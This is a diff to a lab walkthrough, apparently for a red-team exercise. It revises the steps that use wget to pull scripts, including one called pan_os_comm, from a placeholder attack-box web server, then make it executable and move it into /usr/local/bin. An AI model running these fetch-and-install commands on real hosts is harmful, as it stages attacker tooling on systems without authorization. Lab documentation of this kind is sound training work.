@@ -352,17 +352,16 @@ cd ~
 ls
 ```
 
-2. Next, import the `pan_os_comm` script from your attack machine, where it is being hosted via the web server.
+2. Next, import the scripts from your attack machine, where they are being hosted via the web server.
+The following command pulls the files and puts them into the current users home directory.
    ```bash
-      wget -O /usr/local/bin/pan_os_comm http://<IP_of_your_attack_box>:51855/pan_os_comm
+      wget -r -np -nH --cut-dirs=1 -P ~ http://<IP_of_your_attack_box>:51855/
    ```
+ 3. cd to current users home directory: `cd ~`
+   make pan_os_comm executable: `chmod +x pan_os_comm`
+   move pan_os_comm to /usr/local/bin/: `mv pan_os_comm /usr/local/bin/`
 
-3. Once created, run the following command:
-   ```bash
-   chmod +x pan_os_comm
-   ```
-
-5. To ensure that the file has been successfully downloaded and is executable, run:
+4. To ensure that the file has been successfully downloaded and is executable, run:
 
 ```bash
 ls -l /usr/local/bin | grep pan_os
